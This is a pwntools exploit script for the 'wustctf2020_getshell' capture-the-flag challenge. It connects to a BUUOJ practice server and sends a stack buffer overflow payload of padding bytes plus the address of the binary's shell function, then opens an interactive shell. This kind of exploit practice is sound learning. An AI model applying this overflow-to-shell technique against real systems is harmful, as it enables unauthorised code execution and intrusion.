from pwn import *

def wustctf2020_getshell(file_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/wustctf2020_getshell'):
    print('wustctf2020_getshell start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 28631)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x08048399)  # pop ebx ; ret
    shell_addr = p32(target_elf.symbols['shell'])

    payload = b'a' * 28
    payload += shell_addr
    print(len(payload))

    # gdb.attach(target)
    target.sendline(payload)
    target.interactive()
    print('wustctf2020_getshell end')

if __name__ == '__main__':
    wustctf2020_getshell()